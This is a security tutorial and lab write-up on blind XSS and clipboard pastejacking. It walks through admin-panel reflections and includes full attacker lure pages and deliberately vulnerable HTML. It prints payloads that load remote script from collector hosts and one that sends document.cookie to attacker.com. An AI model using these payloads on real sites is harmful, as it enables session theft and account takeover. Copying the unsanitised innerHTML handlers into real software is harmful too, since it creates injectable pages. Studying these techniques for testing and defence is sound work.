# Blind XSS

* **What it is:** Blind XSS is a stored XSS where the attacker’s payload is saved by the app but **not** immediately reflected back to the attacker. Instead it executes later in another context (admin panel, email viewer, log viewer, etc.), so the attacker sees no immediate browser pop-up — hence “blind.”
* **Typical flow:** Attacker injects payload → payload is stored (DB, logs, ticket system, file metadata) → a different user or backend process opens the stored data → payload executes in that victim’s browser/context → attacker receives out-of-band evidence (callback/DNS/HTTP).
* **Common sinks:** admin dashboards, support/CRM systems, email previews, log viewers, scheduled reports, file previewers, notification systems.
* **Why it’s dangerous:** Execution happens in a higher-privilege context (admins), can steal session tokens, perform actions, pivot, or exfiltrate data via OOB channels — often unnoticed for longer.
* **How defenders detect it:** instrument out-of-band (OOB) testing using safe collaborator services (DNS/HTTP callbacks), monitor server logs for unexpected script activity, add alerting on suspicious HTML in stored fields, and review rendered outputs in admin UIs.

{% hint style="info" %}
_Even though it seems that the payload is percent encoded in the source code it might execute XSS somewhere else like in the admin panel etc._&#x20;
{% endhint %}

## Target - 1&#x20;

<figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

We can see that no users is created yet. let's create a user.&#x20;

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

We can see that user in the user list and we're directly logged in as that user. Let's check the profile section.&#x20;

<figure><img src="../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

We can see that we're given the option to edit our information in the profile tab. let's try to enter some payload if we can find stored XSS therein.&#x20;

### Checking for reflections

<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

We can see that when we try to update the profile it is reflecting back in the same textarea field. Also we know that there is no way to execute any other tag inside textarea. So for executing XSS we need to break out of the textarea.&#x20;

<figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

But still there is no any change. Let's see the source code for what hapenned.&#x20;

<figure><img src="../../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

We can see that the payload is URL encoded. Let's now see that user from the admin panel with the admin credentials provided to us. We can see that user list there too.&#x20;

<figure><img src="../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

And boom on clicking on that user we strike an XSS therein.&#x20;

<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

Thus we can't determine where the internal reflection may be possible. So we continuously need to check the payloads and if it is reflecting somewhere else that we couldn't determine. Same case of `aree` industries where I have found a stored XSS in which payload was entered while registration but later it reflected when someone else tried to view our profile.&#x20;

{% hint style="info" %}
_Note the `"/>` used in the payload context. Make sure to use this before starting any payload because what it does is it tries to close any other tag that is yet open._&#x20;
{% endhint %}

## Target - 2

<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

On clicking on placing order it is simply replying with a message that your order has been placed and not a single input of that is being reflected back. So can we find XSS herein. let's check in the admin panel what new things we did get.&#x20;

<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

Thus we can see that the admin is able to see various orders placed by the customers and the address of the customer. As well as it seems that the website is trying to fingerprint the customer for some tracking details. Let's try to use burp suite match and replace to modify all these and let's check if we can execute XSS therein.&#x20;

But note that the developer here corrected the mistake that he did in the target-1 thus we're unable to execute XSS from the `Customer Address` field. But he forgot to encode/sanitize the Request headers that is stored and reflected in the admin panel that they had done for the fingerprinting. let's take advantage of it.&#x20;

<figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

Place the order again so that the malicious header will go in the admin panel. And boom. :bomb:

<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

But let's say we're unable to access the admin panel then how to determine/find this vulnerability. So the answer is simple. instead of attaching an XSS payload attach this and log requests on your server:&#x20;

**`<svg/onload=import('//mybxss.site')>`**

{% hint style="info" %}
_Note that this alerts didn't come immediately. Sometimes it takes days/weeks/months to execute because we don't know when the admin might open things or whether he will open or not. But this is the simplest and best method to demonstrate blind XSS vulnerability._&#x20;
{% endhint %}

## Blind XSS via Clipboard Paste Handling

#### What Is Clipboard Paste XSS? <a href="#id-58b6" id="id-58b6"></a>

**Clipboard Paste XSS occurs when a web application:**

1. Accepts **HTML content** from the clipboard during a paste event
2. Inserts that HTML directly into the DOM (e.g., using innerHTML).
3. Fails to sanitize or properly escape the pasted content.

This creates a situation where a malicious payload copied into the clipboard by an attacker can execute JavaScript once pasted into the vulnerable site.

#### Step-by-Step Attack Flow <a href="#id-0a59" id="id-0a59"></a>

**Let's break it down from both the attacker's and the victim's perspective**

**1. Attacker Prepares a Malicious Page**

The attacker hosts a page with a button or action that copies **HTML payloads** (not just plain text) into the user's clipboard.

**Example attacker page (copy.html):**

{% code overflow="wrap" %}
```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Super Sale - Limited Coupons</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(120deg, #f6d365 0%, #fda085 100%);
      text-align: center;
      padding: 50px;
    }
    .card {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
      display: inline-block;
      padding: 40px;
      max-width: 400px;
    }
    h1 {
      margin-bottom: 10px;
      color: #e74c3c;
    }
    p {
      margin-bottom: 20px;
      font-size: 16px;
      color: #444;
    }
    button {
      background: #e74c3c;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background: #c0392b;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>🔥R Mega Sale oupon</h1>
    <p>Click the button to copy your exclusive coupon code and save big at checkout!</p>
    <button id="copy">Copy Coupon</button>
  </div>

  <script>
    const htmlPayload = `<img src=x onerror="alert('XSS via paste')">`;
    document.getElementById('copy').addEventListener('click', () => {
      const onCopy = e => {
        e.clipboardData.setData('text/html', htmlPayload);
        e.clipboardData.setData('text/plain', 'SALE2025');
        e.preventDefault();
        document.removeEventListener('copy', onCopy);
      };
      document.addEventListener('copy', onCopy);
      document.execCommand('copy');
      alert('Coupon copied! Paste it into the store checkout box.');
    });
  </script>
</body>
</html>
```
{% endcode %}

When the victim clicks the Copy Coupon button, the site quietly saves two things to their clipboard: a harmless-looking code (SALE2025) and a hidden piece of HTML. The code looks normal and keeps the victim unsuspecting.

**2. Victim Visits a Vulnerable Site**

The victim (or target admin) goes to a site with a field that supports rich text input for example:

* A comment editor
* A support ticket system
* A WYSIWYG editor
* CMS admin panels

If the site reads text/html from the clipboard, the hidden payload slips in and is injected automatically.

**3. Victim Pastes the Payload**

The victim presses **Ctrl+V** in the vulnerable field. The site's paste handler might look like this:

{% code overflow="wrap" %}
```javascript
element.addEventListener('paste', e => {
const html = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');
e.preventDefault();
element.innerHTML = html; // ⚠️ Dangerous
});
```
{% endcode %}

Because innerHTML is used directly, the HTML from the clipboard is inserted and executed.

**4. Payload Executes**

**At this point, the payload runs inside the site's origin. For example:**

* An alert() box might pop up.
* Or, in a real attack, a hidden request could steal cookies, session tokens, or CSRF tokens.

### Blind XSS Scenario <a href="#id-2966" id="id-2966"></a>

If the victim's paste action **stores** the payload (e.g., in a comment or ticket) and an **admin later views it**, the XSS will trigger in the admin's browser. The attacker may never see this page they only get callbacks from their payload. This makes it a **Blind XSS**.

**Proof of Concept (Local Demo)**

**To replicate this locally, I created two scripts:**

1. Save the **attacker page (copy.html)** above.
2. Create a **vulnerable page (victim.html):**

{% code overflow="wrap" expandable="true" %}
```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Checkout - Apply Coupon</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      padding: 50px;
      text-align: center;
    }
    .checkout-box {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
      display: inline-block;
      padding: 40px;
      max-width: 400px;
    }
    h2 {
      margin-bottom: 20px;
      color: #2c3e50;
    }
    #box {
      border: 2px dashed #ccc;
      padding: 15px;
      min-height: 60px;
      font-size: 16px;
      border-radius: 6px;
      outline: none;
    }
    #box:focus {
      border-color: #3498db;
    }
    p.note {
      color: #888;
      font-size: 14px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="checkout-box">
    <h2>Apply Your Coupon</h2>
    <div id="box" contenteditable="true"></div>
    <p class="note">👉R Click inside the box and pres <b>Ctrl+V</b> to paste your coupon.</p>
  </div>

  <script>
    const box = document.getElementById('box');
    box.addEventListener('paste', e => {
      const html = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');
      e.preventDefault();
      // Vulnerable: directly inserting untrusted HTML
      box.innerHTML = html;
    });
  </script>
</body>
</html>
```
{% endcode %}

3\. Open copy.html, click Copy Coupon.

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

4. Open victim.html, click inside the box and press Ctrl+V.

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

5\. The alert will fire showing the XSS worked.

**For Blind XSS:** just replace attacker.com with your own blind XSS server (Burp, Interact.sh, etc.)

{% code overflow="wrap" %}
```xml
Copyconst htmlPayload = `<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">`;
or 
const htmlPayload = `'\"><script src=https://xss.report/c/coffinxp></script>`;
```
{% endcode %}

#### Where to Test in Real Applications <a href="#id-7775" id="id-7775"></a>

* Comment systems with formatting options.
* Chat or messaging platforms that allow rich text.
* Support ticket or CRM tools.
* Content Management Systems (CMS) admin panels.

{% hint style="info" %}
_❌ It won't work in simple  \<input> or  \<textarea> fields, because those only accept plain text._
{% endhint %}

### Self Made Lab Paste-Jack Testing

#### Attacker.html

{% code overflow="wrap" expandable="true" %}
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Deal Alert! 🚨</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            color: #fff;
            text-align: center;
            padding: 60px 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .alert-box {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }
        p {
            font-size: 1.2em;
            margin-bottom: 30px;
            line-height: 1.4;
        }
        .copy-btn {
            background: #fff;
            color: #ff6b6b;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        .copy-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
            background: #f8f9fa;
        }
        .copy-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        .success-msg {
            margin-top: 20px;
            font-size: 1em;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .success-msg.show {
            opacity: 1;
        }
        .error-msg {
            margin-top: 20px;
            font-size: 1em;
            color: #ffd700;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .error-msg.show {
            opacity: 1;
        }
        /* Hidden text for execCommand fallback */
        .hidden-text {
            position: absolute;
            left: -9999px;
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="alert-box">
        <h1>🚨 Flash Deal Unlocked!</h1>
        <p>Grab your secret promo code now and score 50% off sitewide. Limited time—copy and paste at checkout!</p>
        <button class="copy-btn" id="copyBtn">Copy Secret Code</button>
        <div id="successMsg" class="success-msg">✅ Code copied! Paste it in the promo field to activate.</div>
        <div id="errorMsg" class="error-msg">⚠️ Copy failed—try again or use Ctrl+C on selected text.</div>
    </div>

    <!-- Hidden element for execCommand to "select" and copy from -->
    <textarea id="hiddenTextarea" class="hidden-text">FLASH50OFF</textarea>

    <script>
        const htmlPayload = `<iframe src="javascript:alert('XSS via pastejacking!')"></iframe>`;
        const copyBtn = document.getElementById('copyBtn');
        const successMsg = document.getElementById('successMsg');
        const errorMsg = document.getElementById('errorMsg');
        const hiddenTextarea = document.getElementById('hiddenTextarea');

        copyBtn.addEventListener('click', () => {
            // Method 1: Try to copy HTML + plain via execCommand with copy event
            const onCopy = (e) => {
                e.clipboardData.setData('text/html', htmlPayload);
                e.clipboardData.setData('text/plain', 'FLASH50OFF');
                e.preventDefault();
            };

            // Temporarily add listener and trigger copy on a selected element
            const originalOnCopy = document.oncopy;
            document.addEventListener('copy', onCopy);
            hiddenTextarea.value = 'FLASH50OFF'; // Ensure plain text is ready
            hiddenTextarea.focus();
            hiddenTextarea.select();

            const successful = document.execCommand('copy');
            document.removeEventListener('copy', onCopy); // Clean up
            document.oncopy = originalOnCopy;

            if (successful) {
                showSuccess();
            } else {
                // Fallback: Manual copy of plain text only (as last resort)
                try {
                    const range = document.createRange();
                    range.selectNodeContents(hiddenTextarea);
                    const selection = window.getSelection();
                    selection.removeAllRanges();
                    selection.addRange(range);
                    document.execCommand('copy');
                    showSuccess(); // Still show success, but note it may be plain-only
                } catch (err) {
                    showError();
                }
            }
        });

        function showSuccess() {
            successMsg.classList.add('show');
            errorMsg.classList.remove('show');
            setTimeout(() => successMsg.classList.remove('show'), 3000);
        }

        function showError() {
            errorMsg.classList.add('show');
            successMsg.classList.remove('show');
            setTimeout(() => errorMsg.classList.remove('show'), 3000);
        }
    </script>
</body>
</html>
```
{% endcode %}

#### Vulnerable.html

{% code overflow="wrap" expandable="true" %}
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TechGadgets Store - Your One-Stop Shop for Electronics</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f4f4f4;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 1rem 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
        }
        .logo {
            font-size: 1.8rem;
            font-weight: bold;
        }
        .nav-links {
            display: flex;
            list-style: none;
            gap: 2rem;
        }
        .nav-links a {
            color: white;
            text-decoration: none;
            transition: color 0.3s;
        }
        .nav-links a:hover {
            color: #ffd700;
        }
        .hero {
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 400"><rect fill="%23f0f0f0" width="1200" height="400"/><text x="600" y="200" font-size="24" text-anchor="middle" fill="%23667eea">Featured Products Banner</text></svg>') no-repeat center/cover;
            padding: 4rem 2rem;
            text-align: center;
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .hero h1 {
            font-size: 3rem;
            margin-bottom: 1rem;
        }
        .hero p {
            font-size: 1.2rem;
        }
        .container {
            max-width: 1200px;
            margin: 2rem auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 2rem;
        }
        .products {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem;
        }
        .product-card {
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        .product-card:hover {
            transform: translateY(-5px);
        }
        .product-card img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            background: #ddd; /* Placeholder for image */
        }
        .product-info {
            padding: 1rem;
        }
        .product-info h3 {
            margin-bottom: 0.5rem;
        }
        .product-info .price {
            color: #e74c3c;
            font-weight: bold;
            font-size: 1.1rem;
        }
        .chat-widget {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 300px;
            height: 400px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            display: flex;
            flex-direction: column;
            z-index: 1000;
        }
        .chat-header {
            background: #667eea;
            color: white;
            padding: 1rem;
            border-radius: 10px 10px 0 0;
            text-align: center;
        }
        .chat-messages {
            flex: 1;
            padding: 1rem;
            overflow-y: auto;
            border-bottom: 1px solid #eee;
        }
        .message {
            margin-bottom: 1rem;
            padding: 0.5rem;
            border-radius: 5px;
            background: #f9f9f9;
        }
        .chat-input {
            display: flex;
            flex-direction: column;
            padding: 1rem;
            gap: 0.5rem;
        }
        .chat-input .input-area {
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 0.5rem;
            min-height: 60px;
            font-family: inherit;
            outline: none;
            /* Key: contenteditable for rich paste */
        }
        .chat-input button {
            background: #667eea;
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
            align-self: flex-end;
        }
        .chat-input button:hover {
            background: #5a67d8;
        }
        .chat-toggle {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #667eea;
            color: white;
            border: none;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            cursor: pointer;
            z-index: 999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <header>
        <nav>
            <div class="logo">TechGadgets</div>
            <ul class="nav-links">
                <li><a href="#">Home</a></li>
                <li><a href="#">Products</a></li>
                <li><a href="#">Cart</a></li>
                <li><a href="#">Support</a></li>
            </ul>
        </nav>
    </header>

    <section class="hero">
        <h1>Welcome to TechGadgets Store!</h1>
        <p>Discover the latest in tech with unbeatable prices and fast shipping!</p>
    </section>

    <div class="container">
        <section class="products">
            <div class="product-card">
                <div style="background: #ddd; height: 200px; display: flex; align-items: center; justify-content: center; color: #999;">Product Image</div>
                <div class="product-info">
                    <h3>Wireless Headphones</h3>
                    <p>Premium sound quality with noise cancellation.</p>
                    <div class="price">$99.99</div>
                </div>
            </div>
            <div class="product-card">
                <div style="background: #ddd; height: 200px; display: flex; align-items: center; justify-content: center; color: #999;">Product Image</div>
                <div class="product-info">
                    <h3>Smart Watch</h3>
                    <p>Track your fitness and stay connected.</p>
                    <div class="price">$199.99</div>
                </div>
            </div>
            <div class="product-card">
                <div style="background: #ddd; height: 200px; display: flex; align-items: center; justify-content: center; color: #999;">Product Image</div>
                <div class="product-info">
                    <h3>Bluetooth Speaker</h3>
                    <p>Portable audio for on-the-go vibes.</p>
                    <div class="price">$49.99</div>
                </div>
            </div>
        </section>

        <aside>
            <h3>Quick Links</h3>
            <ul style="list-style: none; padding: 1rem 0;">
                <li><a href="#">Shipping Info</a></li>
                <li><a href="#">Returns</a></li>
                <li><a href="#">FAQ</a></li>
            </ul>
        </aside>
    </div>

    <!-- Live Chat Widget -->
    <button class="chat-toggle" onclick="toggleChat()">💬</button>
    <div id="chatWidget" class="chat-widget hidden">
        <div class="chat-header">
            <h4>Live Support</h4>
        </div>
        <div id="chatMessages" class="chat-messages">
            <div class="message"><strong>Support:</strong> Hello! How can I help you today? Paste promo codes here for instant validation!</div>
        </div>
        <form class="chat-input" onsubmit="sendMessage(event)">
            <div id="messageInput" class="input-area" contenteditable="true" placeholder="Type your message... (Paste coupons here too!)"></div>
            <button type="submit">Send</button>
        </form>
    </div>

    <script>
        function toggleChat() {
            const widget = document.getElementById('chatWidget');
            widget.classList.toggle('hidden');
        }

        // NEW: Debug paste handler to force HTML insertion and log
        document.getElementById('messageInput').addEventListener('paste', function(e) {
            e.preventDefault(); // Prevent default paste (which might be plain text)
            const clipboardData = e.clipboardData || window.clipboardData;
            const pastedHTML = clipboardData.getData('text/html') || clipboardData.getData('text/plain');
            console.log('Pasted HTML:', pastedHTML); // Check this in F12 Console!

            // Insert as HTML
            const tempDiv = document.createElement('div');
            tempDiv.innerHTML = pastedHTML;
            while (tempDiv.firstChild) {
                this.appendChild(tempDiv.firstChild);
            }

            // Also log the full innerHTML after insert
            setTimeout(() => {
                console.log('Input innerHTML after paste:', this.innerHTML);
            }, 100);
        });

        function sendMessage(event) {
            event.preventDefault();
            const input = document.getElementById('messageInput');
            const messageHTML = input.innerHTML.trim(); // Get innerHTML to preserve pasted HTML
            console.log('Sending messageHTML:', messageHTML); // Debug log before insert
            if (messageHTML) {
                // VULNERABLE: Directly set innerHTML without sanitization
                // This allows pasted HTML (from pastejacking) to execute as code
                const messageDiv = document.createElement('div');
                messageDiv.className = 'message';
                messageDiv.innerHTML = '<strong>You:</strong> ' + messageHTML;
                document.getElementById('chatMessages').appendChild(messageDiv);
                
                // Clear input
                input.innerHTML = '';
                
                // Simulate bot response
                setTimeout(() => {
                    const botDiv = document.createElement('div');
                    botDiv.className = 'message';
                    botDiv.innerHTML = '<strong>Support:</strong> Thanks for your message! Processing...';
                    document.getElementById('chatMessages').appendChild(botDiv);
                    document.getElementById('chatMessages').scrollTop = document.getElementById('chatMessages').scrollHeight;
                }, 1000);
                
                document.getElementById('chatMessages').scrollTop = document.getElementById('chatMessages').scrollHeight;
            }
        }

        // Allow Enter to send
        document.getElementById('messageInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                sendMessage(e);
            }
        });
    </script>
</body>
</html>
```
{% endcode %}

#### Demo

**attacker.html page. Copy payload from here.**&#x20;

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**vulnerable.html. paste the payload in the chatbot and see the boom.**&#x20;

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

#### Why This Pastejacking Attack Worked

* **Clipboard Dual-Format**: Attacker page copies "FLASH50OFF" as plain text (visible) + malicious \<iframe src="javascript:alert(...)"> as HTML, tricking users into pasting "code" without suspicion.
* **Forced HTML Paste**: Vulnerable site's paste event handler prevents default (plain-text) paste and explicitly inserts clipboard's text/html data as DOM nodes via innerHTML, preserving the iframe.
* **Execution on Render**: Sending moves the HTML to chat messages via innerHTML, parsing the iframe's javascript: URI to run the alert immediately—no event handlers needed, bypassing common filters.
* **No Sanitization**: Demo lacks HTML escaping (e.g., no textContent or DOMPurify), allowing arbitrary code execution on paste/send.

